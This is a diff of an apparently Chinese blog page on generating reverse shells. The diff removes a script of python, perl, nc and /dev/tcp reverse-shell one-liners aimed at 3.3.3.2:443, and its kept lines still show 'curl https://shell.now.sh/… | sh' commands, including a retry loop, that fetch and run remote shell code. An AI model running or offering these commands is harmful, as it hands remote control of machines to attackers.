@@ -51,7 +51,7 @@
 
 <meta itemprop="datePublished" content="2020-03-27T14:37:35&#43;08:00" />
 <meta itemprop="dateModified" content="2020-03-27T14:37:35&#43;08:00" />
-<meta itemprop="wordCount" content="2482">
+<meta itemprop="wordCount" content="2394">
 
 
 
@@ -147,50 +147,7 @@
 我们可以通过 <code>curl https://shell.now.sh/3.3.3.2:443 | sh</code> 获取到反弹shell代码, 分别判断服务器是否存在python/perl/nc/sh, 再交给sh或者bash执行即可</p>
 
 <p><img src="https://img.04z.net/img/Generate-reverse-shell-2.png" alt="Alt text" /></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">if command -v python &gt; /dev/null 2&gt;&amp;1; then
-	python -c &#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&#34;3.3.3.2&#34;,443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
-	exit;
-fi
 
-if command -v perl &gt; /dev/null 2&gt;&amp;1; then
-	perl -e &#39;use Socket;$i=&#34;3.3.3.2&#34;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
-	exit;
-fi
-
-if command -v nc &gt; /dev/null 2&gt;&amp;1; then
-	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 3.3.3.2 443 &gt;/tmp/f
-	exit;
-fi
-
-if command -v sh &gt; /dev/null 2&gt;&amp;1; then
-	/bin/sh -i &gt;&amp; /dev/tcp/3.3.3.2/443 0&gt;&amp;1
-	exit;
-fi</pre></td></tr></table>
-</div>
-</div>
 <p>当然有些特殊情况, 比如网络不是特别稳定, 你可能喜欢while循环</p>
 
 <p><code>while true; do curl https://shell.now.sh/yourip:443 | sh; done</code></p>
